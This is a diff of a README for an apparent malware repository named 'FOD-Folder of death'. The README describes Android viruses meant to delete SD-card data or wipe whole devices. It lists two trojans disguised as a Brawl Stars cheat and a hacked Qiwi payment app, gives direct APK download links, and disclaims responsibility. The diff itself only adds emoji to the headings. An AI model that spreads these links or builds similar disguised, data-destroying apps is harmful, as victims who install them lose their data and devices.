@@ -1,10 +1,10 @@
 # FOD
 FOD-Folder of death
 
-# ATTENTION
+# 📛ATTENTION
 The way you use this virus and all responsibility lies only with you. Its creator does not bear any responsibility for your actions
 
-# What's it?
+# ❓What's it?
 This is a repository that contains a lot of different viruses, so far for Android
 
 These viruses are divided into two types:
@@ -18,7 +18,7 @@ Ie the HSE view is the view from the original version(without the icon and a goo
 
 The ESE view is a view where everything is well done(there is an icon and a good menu and good name)
 TipeV-Tipe virus
-# All TipeV:
+# 🔰All TipeV:
 # 1.DV-Deleteneng virus
 Virus that deletes data from your phone (SD card)
 # 2.AD-All deleted
@@ -26,15 +26,15 @@ Delete everything from your device
 # 3.FP-Frized phone
 A virus that infects your device
 
-# Viruses:
+# 😷Viruses:
 
-# BrawlStarsChit
+# 🎮BrawlStarsChit 
 Name:BrawlStarsChit tipe:ESE version:0.1 tipeV:DV
 
-# QiwiHV
+# 🥝QiwiHV
 Name:QiwiHakedVersion Tipe:ESE version:0.1 tupeV:DV
 # Install(Clickable):
-# BSC
+# 🎮BSC
 https://github.com/rokSkr/FOD/raw/main/BrawlStarsChit2.apk
-# QHV
+# 🥝QHV
 https://github.com/rokSkr/FOD/blob/main/QiwiHV.apk?raw=true
